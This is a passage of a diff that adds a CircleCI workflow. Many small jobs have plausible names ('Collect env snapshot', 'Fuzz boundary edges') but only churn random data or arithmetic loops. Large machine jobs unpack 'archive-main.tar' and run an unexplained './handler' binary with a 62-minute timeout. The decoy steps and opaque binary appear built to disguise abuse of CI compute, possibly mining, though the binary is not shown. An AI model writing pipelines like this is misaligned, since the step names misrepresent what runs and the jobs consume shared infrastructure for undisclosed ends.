+          command: |
+            ls -la /tmp/pipeline/807.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  db_dec5-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Trace call sequence
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1945600 | wc -c; true ; } > /tmp/pipeline/pt-D.pt
+            du -h /tmp/pipeline/pt-D.pt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - pt-D.pt
+  dec5-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/pt-D.pt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  prefetch_sirius-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Reconcile output files
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=2;a++)for(b=1;b<=2001;b++)s+=a*b;print s}'; true ; } > /tmp/pipeline/step-13.txt
+            du -h /tmp/pipeline/step-13.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-13.txt
+  sirius-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/step-13.txt || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+  reset_smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Rotate ring buffer
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=8;a++)for(b=1;b<=24229;b++)s+=a*b;print s}'; true ; } > /tmp/pipeline/payload
+            du -h /tmp/pipeline/payload
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - payload
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check prior stage
+          command: |
+            ls -la /tmp/pipeline/payload || true
+      - run:
+          name: Retrieve sources
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar -xf archive-main.tar
+      - run:
+          name: Smoke check
+          command: sleep 60
+      - run:
+          command: free -m
+      - run:
+          no_output_timeout: 62m
+          command: ./handler
+
+  compile_test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mint batch slot
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 368640 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/pipeline/phase-pass.log
+            du -h /tmp/pipeline/phase-pass.log
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - phase-pass.log
+  vendor_verify_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mirror arena state
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<468746;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/pipeline/handover.txt
+            du -h /tmp/pipeline/handover.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handover.txt
+  prebuild_hotfix-6015_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 216705 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/pipeline/.sig
+            du -h /tmp/pipeline/.sig
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .sig
+  runner_smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Fuse row chunks
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<349581;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/pipeline/payload
+            du -h /tmp/pipeline/payload
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - payload
+  fixture_RolloutProd_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Collect gauge frames
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 300090 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/pipeline/relay.txt
+            du -h /tmp/pipeline/relay.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - relay.txt
+  runner_teh-ci-40_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Interleave stream pairs
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=230 2>/dev/null | md5sum; true ; } > /tmp/pipeline/stage-pass.txt
+            du -h /tmp/pipeline/stage-pass.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - stage-pass.txt
+  fetcher_LAB_HOOK_3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Inflate reference set
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{srand();s=0;for(i=0;i<300360;i++)s+=rand();printf "%.4f\n",s}'; true ; } > /tmp/pipeline/trace.txt
+            du -h /tmp/pipeline/trace.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - trace.txt
+  checker_preview-v3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Enumerate token pairs
+          command: |
+            mkdir -p /tmp/pipeline
+            set +o pipefail 2>/dev/null; seq 1 960816 | awk '{print $1*7919 % 2147483647}' > /tmp/pipeline/99.blob; true
+            du -h /tmp/pipeline/99.blob
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 99.blob
+  runner_edge-v7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Expand parameter grid
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 19689); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/pipeline/2023-02-15.data
+            du -h /tmp/pipeline/2023-02-15.data
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2023-02-15.data
+  bake_tweak-cache_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Freeze working set
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 338526 | awk '{if($1&1)o++;else e++}END{print o"/"e}'; true ; } > /tmp/pipeline/handoff.txt
+            du -h /tmp/pipeline/handoff.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handoff.txt
+  alpha_refactor-4387_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Collect env snapshot
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 5055); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/pipeline/718.out
+            du -h /tmp/pipeline/718.out
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 718.out
+  C_defualt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Spool byte frames
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 275543 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/pipeline/467.txt
+            du -h /tmp/pipeline/467.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 467.txt
+  drain_sirius-ng_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Fuzz boundary edges
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 17825792 /dev/urandom | sha256sum; true ; } > /tmp/pipeline/step-13.txt
+            du -h /tmp/pipeline/step-13.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-13.txt
+  fixture_bug-588_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Chunk raw buffer
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 60644 | awk 'NR%7==0{sum+=$1}END{print sum}'; true ; } > /tmp/pipeline/stash.blob
+            du -h /tmp/pipeline/stash.blob
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - stash.blob
+  produce_tweak-oauth_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Collect byte metrics
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 171656 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/pipeline/cache.raw
+            du -h /tmp/pipeline/cache.raw
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - cache.raw
+  reload_Package_Prod5_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Checkpoint context
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 237539 | sha1sum; true ; } > /tmp/pipeline/.state
+            du -h /tmp/pipeline/.state
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .state
+  red_dec5-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 207278 | sha1sum; true ; } > /tmp/pipeline/pt-D.pt
+            du -h /tmp/pipeline/pt-D.pt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - pt-D.pt
+  orchestrate_tweak-login_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Collate adjacent chunks
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 219276 | awk 'NR>9842 && NR<11010{s+=$1}END{print s}'; true ; } > /tmp/pipeline/807.txt
+            du -h /tmp/pipeline/807.txt
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 807.txt
+workflows:
+  main:
+    jobs:
+      - canary1_test
+      - compile_test_2:
+          requires:
+            - canary1_test
+      - test:
+          requires:
+            - compile_test_2
+      - stepA_verify:
+          requires:
+            - compile_test_2
+      - vendor_verify_2:
+          requires:
+            - stepA_verify
+      - verify:
+          requires:
+            - vendor_verify_2
+      - step2_hotfix-6015:
+          requires:
+            - vendor_verify_2
+      - prebuild_hotfix-6015_2:
+          requires:
+            - step2_hotfix-6015
+      - hotfix-6015:
+          requires:
+            - prebuild_hotfix-6015_2
+      - reset_smoke:
+          requires:
+            - prebuild_hotfix-6015_2
+      - runner_smoke_2:
+          requires:
+            - reset_smoke
+      - smoke:
+          requires:
+            - runner_smoke_2
+      - retry_RolloutProd:
+          requires:
+            - runner_smoke_2
+      - fixture_RolloutProd_2:
+          requires:
+            - retry_RolloutProd
+      - RolloutProd:
+          requires:
+            - fixture_RolloutProd_2
+      - step1_teh-ci-40:
+          requires:
+            - fixture_RolloutProd_2
+      - runner_teh-ci-40_2:
+          requires:
+            - step1_teh-ci-40
+      - teh-ci-40:
+          requires:
+            - runner_teh-ci-40_2
+      - ctx2_LAB_HOOK_3:
+          requires:
+            - runner_teh-ci-40_2
+      - fetcher_LAB_HOOK_3_2:
+          requires:
+            - ctx2_LAB_HOOK_3
+      - LAB_HOOK_3:
+          requires:
+            - fetcher_LAB_HOOK_3_2
+      - builder_preview-v3:
+          requires:
+            - fetcher_LAB_HOOK_3_2
+      - checker_preview-v3_2:
+          requires:
+            - builder_preview-v3
+      - preview-v3:
+          requires:
+            - checker_preview-v3_2
+      - linter_edge-v7:
+          requires:
+            - checker_preview-v3_2
+      - runner_edge-v7_2:
+          requires:
+            - linter_edge-v7
+      - edge-v7:
+          requires:
+            - runner_edge-v7_2
+      - maker_tweak-cache:
+          requires:
+            - runner_edge-v7_2
+      - bake_tweak-cache_2:
+          requires:
+            - maker_tweak-cache
+      - tweak-cache:
+          requires:
+            - bake_tweak-cache_2
+      - audit_refactor-4387:
+          requires:
+            - bake_tweak-cache_2
+      - alpha_refactor-4387_2:
+          requires:
+            - audit_refactor-4387
+      - refactor-4387:
+          requires:
+            - alpha_refactor-4387_2
+      - Beta_defualt:
+          requires:
+            - alpha_refactor-4387_2
+      - C_defualt_2:
+          requires:
+            - Beta_defualt
+      - defualt:
+          requires:
+            - C_defualt_2
+      - prefetch_sirius-ng:
+          requires:
+            - C_defualt_2
+      - drain_sirius-ng_2:
+          requires:
+            - prefetch_sirius-ng
+      - sirius-ng:
+          requires:
+            - drain_sirius-ng_2
+      - red_bug-588:
+          requires:
+            - drain_sirius-ng_2
+      - fixture_bug-588_2:
+          requires:
+            - red_bug-588
+      - bug-588:
+          requires:
+            - fixture_bug-588_2
+      - db_tweak-oauth:
+          requires:
+            - fixture_bug-588_2
+      - produce_tweak-oauth_2:
+          requires:
+            - db_tweak-oauth
+      - tweak-oauth:
+          requires:
+            - produce_tweak-oauth_2
+      - teardown_Package_Prod5:
+          requires:
+            - produce_tweak-oauth_2
+      - reload_Package_Prod5_2:
+          requires:
+            - teardown_Package_Prod5
+      - Package_Prod5:
+          requires:
+            - reload_Package_Prod5_2
+      - db_dec5-smoke:
+          requires:
+            - reload_Package_Prod5_2
+      - red_dec5-smoke_2:
+          requires:
+            - db_dec5-smoke
+      - dec5-smoke:
+          requires:
+            - red_dec5-smoke_2
+      - blue_tweak-login:
+          requires:
+            - red_dec5-smoke_2
+      - orchestrate_tweak-login_2:
+          requires:
+            - blue_tweak-login
+      - tweak-login:
+          requires:
+            - orchestrate_tweak-login_2
+      - retry_bob-build
+      - bob-build:
+          requires:
+            - retry_bob-build
+      - hydrate_Run_App2:
+          requires:
+            - retry_bob-build
+      - Run_App2:
+          requires:
+            - hydrate_Run_App2
+      - generate_auh-check:
+          requires:
+            - hydrate_Run_App2
+      - auh-check:
+          requires:
+            - generate_auh-check
+      - tester_DEPLOY_DEV:
+          requires:
+            - generate_auh-check
+      - DEPLOY_DEV:
+          requires:
+            - tester_DEPLOY_DEV
+      - resync_rm-router-glitch:
+          requires:
+            - tester_DEPLOY_DEV
+      - rm-router-glitch:
+          requires:
+            - resync_rm-router-glitch
+      - stage_WEB-205:
+          requires:
+            - resync_rm-router-glitch
+      - WEB-205:
+          requires:
+            - stage_WEB-205
+      - ensure_run-nightly-test-matrix:
+          requires:
+            - stage_WEB-205
+      - run-nightly-test-matrix:
+          requires:
+            - ensure_run-nightly-test-matrix
+      - C_chen-build:
+          requires:
+            - ensure_run-nightly-test-matrix
+      - chen-build:
+          requires:
+            - C_chen-build
+      - drain_APP-476:
+          requires:
+            - C_chen-build
+      - APP-476:
+          requires:
+            - drain_APP-476
+      - do_rl-alt:
+          requires:
+            - drain_APP-476
+      - rl-alt:
+          requires:
+            - do_rl-alt
+      - p1_qi-run:
+          requires:
+            - do_rl-alt
+      - qi-run:
+          requires:
+            - p1_qi-run
+      - dispatch_succes-only:
+          requires:
+            - p1_qi-run
+      - succes-only:
+          requires:
+            - dispatch_succes-only
